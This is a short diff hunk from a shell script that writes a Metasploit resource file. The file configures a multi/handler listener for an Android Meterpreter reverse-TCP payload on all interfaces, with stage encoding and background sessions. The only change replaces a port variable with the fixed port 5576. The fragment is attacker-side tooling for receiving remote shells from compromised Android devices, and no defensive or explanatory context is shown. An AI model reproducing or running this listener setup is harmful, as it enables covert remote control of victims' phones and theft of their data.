@@ -36,7 +36,7 @@ echo -e "# msfconsole -q -r 'export.rc'
 use exploit/multi/handler
 set PAYLOAD android/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
-set LPORT $lport
+set LPORT 5576
 set ExitOnSession false
 set EnableStageEncoding true
 run -j" >export.rc
